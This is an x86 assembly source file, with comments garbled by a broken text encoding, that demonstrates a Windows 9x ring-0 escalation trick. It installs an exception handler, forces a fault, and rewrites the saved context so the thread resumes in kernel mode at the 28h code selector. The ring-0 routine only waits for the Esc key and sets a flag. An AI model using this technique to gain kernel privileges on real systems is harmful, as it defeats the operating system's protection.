; ������� � ������� ������ ��� Win9x 
; �����: SEH

.586p
.model flat

callW           macro   x
                extern  x:PROC
                call    x
                endm

.data

_Start:
                push    offset errorhandler1
                push    dword ptr fs:[0]
                mov     fs:[0], esp
                lea     EBX, ring0_proc   ; EBX = ����� ������������ � ring-0
                xor     EAX, EAX
                mov     EAX, [EAX]
errorhandler1:
                mov     ESI, [esp+0ch]    ; EAX = Lp2CONTEXT
                mov     EAX, [ESI+0a4h]   ; EAX = OldEBX
                mov     [ESI+0b8h], EAX   ; NewEIP = OldEBX
                mov     EAX, 28h
                mov     [ESI+0bch], EAX   ; �������� ������� CS �� 28h 
					  ; (�.�. ���������)
                xor     EAX, EAX
                ret

; ��� � ������� ������!
ring0_proc:                                ; r0 start
                push    ss ss
                pop     ds es

                pushad

; ���� ������� Esc
WaitESC:                                   
                in        AL, 60h
                cmp       AL, 1
                jne       WaitESC

                popad
                inc dword ptr [Flag]       ; ������������� ���� �������������       
                jmp $                             

                Flag dd 0
                ddd dd ?
.code

start:
                push    offset offset ddd  ; ���������  "�����"
                push    0                  ;
                push    0                  ;
                push    offset  _Start     ;
                push    0                  ;
                push    0                  ;
                callW   CreateThread       ;
                Waits:
                mov EAX,[Flag]             ; ���� �� ����������
                or EAX,EAX
                jz Waits

exit:
                push        00000000h
                callW       ExitProcess
end start